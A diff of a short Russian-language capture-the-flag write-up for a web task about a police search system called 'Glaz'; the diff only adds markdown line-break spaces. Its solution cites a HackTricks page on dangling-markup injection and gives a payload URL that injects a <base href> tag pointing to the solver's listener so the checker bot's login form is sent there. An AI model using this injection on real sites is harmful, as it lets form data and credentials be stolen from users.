@@ -6,8 +6,8 @@ Medium
 В расследовании недавнего преступления мы опробовали нашу новейшую автоматизированную информационную систему розыска преступников "Глаз". Работает как часы, но вот название так себе, правда? Там сейчас как принимают предложения о новом названии, может поучаствуешь?
 
 ## Решение:
-https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection#stealing-forms
-Скормить черкеру ссылку такого вида:
+https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection#stealing-forms  
+Скормить черкеру ссылку такого вида:  
 `http://taskurl:8081/login?title=<base href="your_listener_url">`
 
 ## Флаг
